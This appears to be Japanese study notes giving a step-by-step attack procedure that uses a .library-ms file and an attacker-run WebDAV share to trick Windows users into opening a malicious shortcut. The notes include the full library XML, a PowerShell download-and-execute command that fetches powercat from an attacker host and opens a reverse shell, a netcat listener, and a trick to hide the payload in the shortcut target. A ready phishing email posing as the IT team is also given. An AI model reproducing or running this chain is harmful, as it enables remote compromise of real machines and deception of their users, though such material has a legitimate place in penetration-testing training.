# 前提知識

## なぜこの手法が有効なのか

直接メールに悪意ある実行ファイルを添付する方法は、スパムフィルターやセキュリティ製品に検知・遮断されやすい。この手法では以下の2段階でそれを回避する。

- **第一段階：** `.library-ms` ファイルをメールで送付する。このファイル形式はスパムフィルターを通り抜けやすく、ターゲットがダブルクリックすると攻撃者のWebDAV共有を「ローカルのフォルダ」のように開かせることができる
- **第二段階：** そのフォルダの中に置いてある `.lnk`（ショートカット）をクリックさせることでリバースシェルを発動させる

## Windows Library Files

- XML形式のファイルで、中身はリンク集のような仮想フォルダ
- ダブルクリックで実行可能
- ローカル・リモート両方のリンクに対応しており、リモートのコンテンツをローカルディレクトリのように表示できる
- ファイル形式：`.library-ms`

## WebDav

- HTTPを使ってWebサーバー上のファイルを読み書きできるプロトコル
- リモートにあるファイルをローカルで開いているように見せかけられる
- 攻撃者はWebDAV共有にリバースシェルのショートカットを配置して悪用する

## ショートカットファイル

- 他のファイル・フォルダ・アプリケーションへのポインタとして機能する特殊なファイル
- ダブルクリックで展開または実行可能
- 直接メールで配信すると遮断されやすいため、`.library-ms` 経由で配布する

## 攻撃フロー

1. 攻撃者がWebDAVサーバーを用意し、「悪意あるショートカットファイル（.lnk）」を置く

2. `.library-ms`ファイルを作る
 
3. ターゲットに`.library-ms`ファイルを送付する

4. ターゲットが`.library-ms`をダブルクリックする
    - Explorer上では「ローカルのフォルダを開いた」ように見える
    - 実際には攻撃者のWebDAVサーバーにつながっている

5. WebDAV上の.lnkファイルをダブルクリックさせる
    - ショートカットファイルの中身でリバースシェルが発動
    - ターゲットのPCから攻撃者へコネクションが確立

---

# .library-ms ＋ WebDAV ＋ .lnk によるReverse Shell実行手順

## 第1段階：WebDAV サーバの準備

1. wsgidavインストール（インストール済みなら不要）
```zsh
sudo apt install python3-wsgidav
```

2. WebDAV サーバ用ディレクトリの作成
```zsh
sudo mkdir ~/Webdav
```

3. （スキップ可）WebDavサーバ用ディレクトリにテスト用として任意のファイルを保存
```zsh
echo test > test.txt
```

4. WebDAVサーバを構築
```zsh
wsgidav --host=0.0.0.0 --port=80 --root=~/Webdav --auth=anonymous
```
- `--host=0.0.0.0`：すべてのインターフェースでWevDavを提供する
- `--root`：WevDavのホームディレクトリを指定する
- `--auth=anonymous`：認証を無効にする

![](../../Images/Pasted%20image%2020250518142233.png)

$$WebDavサーバ構築成功時の出力$$

## 第2段階：ライブラリファイル(.library-ms)の作成

>[!TIP] 
>XMLはテキストファイルなので、Kaliでも作成できる。ただし、Windowsマシン（VMまたはRDP）で作業すると、ライブラリファイルや.lnkの構築・テストが非常に楽になる。

1. VSCodeまたはメモ帳で新規テキストファイル (Plain text) を作成し、`config.library-ms` という名前でデスクトップに保存する

![](../../Images/Pasted%20image%2020250518144800.png)

$$空白Windowsライブラリファイル$$

2. `config.library-ms`ファイルにXMLで記述し、保存（[XMLコードの解説](#XMLコードの解説)）
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1002</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<AttackerIP></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

3. 攻撃者マシンに`config.library-ms`を転送する（webdavディレクトリではないところに格納）

4. （スキップ可）WebDav共有への接続の成功を確認するため、`config.library-ms`ファイルをダブルクリックで実行する
	- [第1段階：WebDAV サーバの準備](#第1段階：WebDAV%20サーバの準備)でWebdavディレクトリに作成した`test.txt`が表示されていたら成功
	- **ファイルパスにはリモートで開かれていることは明示されない**
　　
![](../../Images/Pasted%20image%2020250518171045.png)

$$ライブラリファイルをダブルクリックした画面$$

>[!Warning]
>一度ダブルクリックして実行すると `serialized` タグが追加され、`<url>` の値に `DavWWWRoot` が付与されてしまう。
>このまま別のマシンや再起動後に実行すると攻撃が失敗する可能性があるため、**実行のたびに元のXMLに書き戻す必要**がある（ただしターゲットに一度実行させればいいので大きな問題ではない）。

![](../../Images/Pasted%20image%2020250518171758.png)

$$実行後のライブラリファイルの中身が変わっている$$

## 第3段階：ショートカットファイル（.lnk）ファイルの準備

1. Windowsデスクトップで右クリック → 新規作成 → ショートカットの作成で以下のコマンドを入力して保存する（ファイル名はPretextに沿ったものにする。例：`automatic_configuration`）
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[AttackerIP]:[Port]/powercat.ps1');powercat -c [AttackerIP] -p [ListenerPort] -e powershell"
```

2. 完成した `.lnk` ファイルを攻撃者のKaliマシンのwebdavディレクトリ に配置する

![](../../Images/Pasted%20image%2020250519074203.png)


$$ショートカット作成中の画面$$

>[!TIP] ショートカットファイルを無害に見せる方法
>- ターゲットがショートカットのプロパティを閲覧し、ショートカットのリンク先を確認してエクスプロイトコードに気付くことがある
>- 対策として、エクスプロイトコードのうしろに無害なコマンドを追加して、本来のエクスプロイトコードを見えない位置に追いやることができる
>	- Windows 10までは、Targetに256文字まで表示で、内部では4096文字まで保持できた

![ 350](../../Images/Pasted%20image%2020250519075106.png)

$$ショートカットの実行内容偽装$$

## 第4段階：リバースシェルの受信

1. リバースシェルリスナーを起動
```zsh
sudo rlwrap nc -lvnp <port>
```

2. PowerCatをwebdavディレックトリ**以外**にコピーし、Python webサーバを起動しておく
```zsh
locate powercat.ps1
cp <path_to_powercat.ps1> .
sudo python -m http.server <port> # WebDAVがポート80を使用中のため80以外を指定
```

>[!NOTE]
>PowerCatはWebDAVディレクトリではなく別のディレクトリにホストする。WebDAVは書き込み可能でセキュリティ製品に監視される可能性があり、ペイロードを削除されるおそれがあるため。

3. テストとして、ショートカットファイルをダブルクリックして正常にリバースシェルを受信できるか確認する

## 第5段階：配布と実行

1. Webdavディレクトリに不要な `test.txt` があれば削除し、ライブラリファイルが変更されていたら元のXMLに戻す

2. Pretext（口実）を用いて、メールなどで「ライブラリファイル」(.library-ms)を送付
```
件名：設定ファイルの実行のお願い（ITチームより）

お疲れさまです。ITチームに新しく加わりましたｘｘｘと申します。

先週展開した一部の設定について、今週中を目途として最終的な設定を行っております。  
つきましては、下記の手順で設定の実行をお願いできますでしょうか。

　1. 添付ファイルをダウンロード
　2. ダウンロードフォルダから添付ファイルを開く
　3. 中にある「automatic_configuration」をダブルクリック  

これで設定は完了となります。

ご不明点やエラー等ございましたら、どうぞお気軽にご連絡ください。  
お手数をおかけしますが、よろしくお願いいたします。
```
- →ターゲットが `config.library-ms` を開くと攻撃者のWebDAVがフォルダとして表示され、`automatic_configuration.lnk` をダブルクリックするとリバースシェル獲得！

>[!WARNING]
>ライブラリファイル上でショートカット（.lnk）を実行するとMotWが付与され、攻撃が阻害される可能性がある。

![](../../Images/Pasted%20image%2020250520075229.png)

$$.lnk実行時の警告ポップアップ$$

---

# 補足事項

## XMLコードの解説

1. 名前空間の宣言
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
...
</libraryDescription>
```
- xmlns（xml name space)：XMLにおける名前空間
- `http://schemas.microsoft.com/windows/2009/librarye`：Microsoftのライブラリスキーマに属することを明示する
- [xmlnsにおけるリンク](../用語.md#xmlnsにおけるリンク)

2. 「ドキュメント」のローカライズリソース（文字列・UI要素）などを参照する
```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```
- `<name>`：DLLライブラリの名前を指定
	- 他にも`shell32.dll`が使えるが、"shell"というワードがセキュリティ製品に検知されるかもしれないので使用を避ける
- `-34582`：ドキュメントのリソースID（ピクチャは`-34595`)
	- リソースIDは🔗[Resource Hacker](https://forest.watch.impress.co.jp/article/2001/01/29/okiniiri.html)などのツールを使う方法があるが、生成AIに聞く方が楽
- `<version>`：任意の数値
- [リソースID(`@windows.storage.dll,-34582`)について](#リソースID(`@windows.storage.dll,-34582`)について)

3. ライブラリファイルの見た目を整備する
```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1002</iconReference>
```
- `<isLibraryPinned>`：Windowsエクスプローラーのナビゲーターパネルに表示されるようにする（以下画像赤枠部分）
- `<iconReference>`：ライブラリファイルのアイコンをリソースのみDLLから選択する
	- `imageres.dll`：リソースが格納されたシステム用DLL
		- パス：C:\Windows\System32\imageres.dll
	- 1002：ドキュメントのアイコンを指すリソースID（1003：ピクチャのアイコン）

 ![](../../Images/Pasted%20image%2020250518151605.png)

4. ライブラリファイルがWindowsエクスプローラー上で開かれたときにどのようなカラム構成（以下画像赤枠）になるかを指定する
```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```
- 🔗[Microsoft documentation](https://learn.microsoft.com/ja-jp/windows/win32/shell/schema-library-foldertype)の「フォルダーの種類」に記載されているGUIDを`<folderType>`に指定する（今回はアイコンをドキュメントにしているのでドキュメントのGUIDを指定）
	- 例えばフォルダタイプがミュージックだと、アーティスト名やトラック番号のカラムとなってしまう

![](../../Images/Pasted%20image%2020250518152940.png)

5. ライブラリファイルが指すストレージの場所を指定する
```xml
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://[AttackerIP]</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```
- `<isDefaultSaveLocation>`：ユーザーがファイルを保存したときのwindowsエクスプローラーの挙動・保存場所を指定（true＝デフォルト）
- `<isSupported>`：互換性のために存在するが不要なのでfalse
- `<simpleLocation>`：リモートの場所を指定（WebDav共有）

## リソースID(`@windows.storage.dll,-34582`)について

- `@windows.storage.dll,-34582` は、`windows.storage.dll` の中にあるリソースID 34582 を参照する

- Windowsエクスプローラーでライブラリ（たとえば「ドキュメント」や「ピクチャ」など）を表示するとき、見た目の名称が必要になる
- その表示名をハードコードされた文字列ではなく、DLLの中にあるローカライズ済み（多言語対応された）リソースから取得する形式がこの記述

- 何のためにあるのか？　→　 ライブラリの名前（表示名）を指定するためにある
- 34582じゃなくて適当な値でもいいのか？　→　ダメ
- なぜローカライズDLLを使うのか？↓

| 方法                                                      | 影響                                                           |
| ------------------------------------------------------- | ------------------------------------------------------------ |
| `<name>Documents</name>` のように直接書く                       | ・OSの言語が英語以外（日本語など）の場合に対応できない  <br>・翻訳作業が必要になる  <br>・一貫性がなくなる |
| `<name>@windows.storage.dll,-34582</name>` のようにDLLを参照する | ✅ OSが自動で言語に合わせて表示  <br>✅ Windows標準ライブラリと同じ形式で自然に見える          |
